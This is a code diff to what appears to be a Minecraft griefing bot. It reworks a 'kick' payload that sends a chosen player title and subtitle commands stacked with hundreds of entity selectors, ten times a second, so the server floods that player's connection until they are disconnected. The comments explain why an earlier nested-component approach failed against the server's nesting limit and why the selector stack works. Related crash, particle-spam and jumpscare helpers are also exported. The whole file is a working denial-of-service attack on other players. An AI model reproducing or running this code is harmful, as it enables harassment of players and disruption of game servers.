@@ -37,25 +37,19 @@ const CJK_LAST = 0x9fff;
 const KICK_TEMPLATE = 'execute at {t} run particle minecraft:flame ~ ~ ~ 0 0 0 0 {n} force {t}';
 const KICK_DEFAULT = 2e9;
 
-// The `kick` payload, aimed at `{t}` instead of `@a`: instead of asking the
-// server for a stack of entity selectors, the title is one component nested
-// hundreds of levels deep, every level filled with ideographs. A character that
-// is three bytes in UTF-8 carries three times the bytes a plain ASCII filler
-// does, so a single core command hands the client the most text it can, and the
-// nesting makes the client walk that tree again for every line it draws. The
-// packet goes to that player alone, so only their client builds it. The same
-// component goes into both slots, title and subtitle, so each pair costs the
-// client two of them.
+// The `kick` payload, aimed at `{t}` instead of `@a`: the same method
+// `servercrash title` uses, because that is the one that actually kicks. Every
+// entry in the title's `extra` is an entity selector, and the server resolves
+// each of them when it serialises the title for the target's connection - so
+// what leaves is megabytes, on that player's connection alone. Nested components
+// were tried and did nothing: the title command's JSON is parsed with a nesting
+// limit, so a component hundreds of levels deep is refused before it is sent.
+const SELECTOR_COMPONENT = '{"selector":"@e[limit=100]"}';
 const TITLE_HEAD = 'title {t} title {"text":"phantomSLAY","color":"#ffccee","extra":[';
 const SUBTITLE_HEAD = 'title {t} subtitle {"text":"phantomSLAY","color":"#ffccee","extra":[';
-// The innermost component: what every level of the nesting leads to.
-const NESTED_LEAF = '{"text":"phantomSLAY"}';
-// Ideographs per level. Three bytes each, and enough of them that the text at
-// every level is worth building rather than a wrapper around nothing.
-const NESTED_FILLER = 12;
-// How many levels deep the component goes by default; a longer stack only
-// makes the client walk further, and the count argument raises it.
-const TITLE_DEFAULT = 500;
+// Selectors in the stack, the count `servercrash title` defaults to.
+const TITLE_DEFAULT = 900;
+const TITLE_MAX = 5000;
 
 // Ten title/subtitle pairs a second while the player is still online: the client
 // never finishes laying out one pair before the next is in its queue.
@@ -88,54 +82,28 @@ function targetedKick(name, count) {
     return KICK_TEMPLATE.replaceAll('{t}', target).replaceAll('{n}', String(value));
 }
 
-// The filler is seeded from the name it is aimed at, so kicking the same player
-// twice hands the client the same component instead of a fresh random tree.
-function seededSeed(length, seedText) {
-    let state = 2166136261;
-    const seed = String(seedText || 'vbot');
-    for (let i = 0; i < seed.length; i++) state = Math.imul(state ^ seed.charCodeAt(i), 16777619);
-
-    const span = CJK_LAST - CJK_FIRST + 1;
-    let out = '';
-    for (let i = 0; i < length; i++) {
-        state = Math.imul(state ^ (state >>> 15), 2246822507);
-        state = (state + 0x9e3779b9) | 0;
-        out += String.fromCharCode(CJK_FIRST + ((state >>> 0) % span));
-    }
-    return out;
-}
-
-// The component every level of the title is made of: its own text, then the
-// next level in `extra`. Built as one string rather than by nesting objects,
-// so a command-size stack is cheap to produce.
-function nestedComponent(depth, seed = 'kick') {
-    const levels = Math.max(0, Math.floor(depth));
-    if (!levels) return NESTED_LEAF;
-    const open = `{"text":"${seededSeed(NESTED_FILLER, seed)}","extra":[`;
-    return `${open.repeat(levels)}${NESTED_LEAF}${']}'.repeat(levels)}`;
-}
-
 // The `kick` title, aimed at one name: the title and its subtitle, as the two
-// commands that carry them. Each level costs its own length, so the depth is
+// commands that carry them. Each selector costs its own length, so the stack is
 // clamped to what still fits one core command: core.run() slices at 32000
-// characters, which would cut a long component into invalid JSON. Each slot is
-// its own command, so each gets the whole limit.
+// characters, which would cut the component into invalid JSON. Each slot is its
+// own command, so each gets the whole limit.
 function targetedTitle(name, count) {
     const target = String(name || '').trim();
     if (!target) return null;
 
     const heads = [TITLE_HEAD, SUBTITLE_HEAD].map(head => head.replaceAll('{t}', target));
     const requested = Math.floor(Number(count));
-    const perLevel = `{"text":"${seededSeed(NESTED_FILLER, target)}","extra":[`.length + 2;
-    // The head's own array and component are closed after the levels.
-    const room = COMMAND_LIMIT - NESTED_LEAF.length - 2 - perLevel;
-    const fits = Math.min(...heads.map(head => Math.floor((room - head.length) / perLevel)));
-    const asked = Number.isFinite(requested) && requested > 0 ? requested : TITLE_DEFAULT;
+    const asked = Number.isFinite(requested) && requested > 0
+        ? Math.min(requested, TITLE_MAX)
+        : TITLE_DEFAULT;
+    const per = SELECTOR_COMPONENT.length + 1;
+    // The head's own array and component are closed after the stack.
+    const fits = Math.min(...heads.map(head => Math.floor((COMMAND_LIMIT - head.length - 2) / per)));
     const value = Math.min(asked, fits);
     if (value < 1) return null;
 
-    const component = nestedComponent(value, target);
-    return heads.map(head => `${head}${component}]}`);
+    const stack = new Array(value).fill(SELECTOR_COMPONENT).join(',');
+    return heads.map(head => `${head}${stack}]}`);
 }
 
 const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
@@ -223,8 +191,8 @@ async function buildCrashChest(ctx, position, doublings) {
 
 module.exports = {
     chineseSeed,
-    nestedComponent,
     jumpscareCommand,
+    SELECTOR_COMPONENT,
     JUMPSCARE_INTERVAL_MS,
     JUMPSCARE_PER_SECOND,
     chestPosition,
@@ -234,6 +202,7 @@ module.exports = {
     targetedKick,
     targetedTitle,
     TITLE_DEFAULT,
+    TITLE_MAX,
     TITLE_INTERVAL_MS,
     KICK_INTERVAL_MS,
     SEED_LENGTH,
